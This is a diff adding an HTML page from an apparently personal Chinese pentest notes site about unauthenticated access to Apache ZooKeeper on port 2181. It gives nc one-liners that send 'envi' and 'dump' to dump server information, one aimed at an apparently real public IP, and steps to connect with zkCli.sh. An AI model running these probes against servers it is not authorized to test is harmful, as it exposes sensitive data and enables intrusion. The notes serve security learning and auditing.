@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>zookeeper - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "zookeeper", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u6e17\u900f", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/" class="btn btn-xs btn-link">
+        中远麒麟
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../svn/svn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../svn/svn/" class="btn btn-xs btn-link">
+        svn
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="zookeeper">zookeeper</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#渗透">渗透</a><ul>
+<li><a href="#未授权">未授权</a><ul>
+<li><a href="#查看敏感信息">查看敏感信息</a></li>
+<li><a href="#未授权链接节点">未授权链接节点</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务。它主要服务于分布式系统，可以用ZooKeeper来做：统一配置管理、统一命名服务、分布式锁、集群管理。使用分布式系统就无法避免对节点管理的问题 (需要实时感知节点的状态、对节点进行统一管理等等)，而由于这些问题处理起来可能相对麻烦和提高了系统的复杂性，ZooKeeper作为一个能够通用解决这些问题的中间件就应运而生了。</p>
+<p>ZooKeeper的数据结构，跟Unix文件系统非常类似，可以看做是一颗树，每个节点叫做ZNode。每一个节点可以通过路径来标识。</p>
+<p>ZooKeeper是Apache软件基金会的一个软件项目，它为大型分布式计算提供开源的分布式配置服务、同步服务和命名注册。ZooKeeper的架构通过冗余服务实现高可用性。Zookeeper的设计目标是将那些复杂且容易出错的分布式一致性服务封装起来，构成一个高效可靠的原语集，并以一系列简单易用的接口提供给用户使用。</p>
+<p>默认端口2181</p>
+<h2 id="_2">渗透</h2>
+<h3 id="_3">未授权</h3>
+<h4 id="_4">查看敏感信息</h4>
+<pre><code class="language-纯文本">echo envi|nc 10.10.10.10 2181
+</code></pre>
+<p><img alt="" src="../image/image_JhZjzsJRmE.png" /></p>
+<pre><code class="language-纯文本">echo dump|nc 180.184.68.42 2181
+</code></pre>
+<p><img alt="" src="../image/image_PNlwLdlhAs.png" /></p>
+<h4 id="_5">未授权链接节点</h4>
+<pre><code class="language-纯文本">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.9.0/apache-zookeeper-3.9.0-bin.tar.gz
+
+tar -zxvf ./apache-zookeeper-3.9.0-bin.tar.gz
+
+cd apache-zookeeper-3.9.0-bin/bin
+
+/zkCli.sh -server 10.14.6.4:2181
+
+</code></pre>
+<p>也可以用这个链接（windows）</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/" class="btn btn-xs btn-link">
+        中远麒麟
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../svn/svn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../svn/svn/" class="btn btn-xs btn-link">
+        svn
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
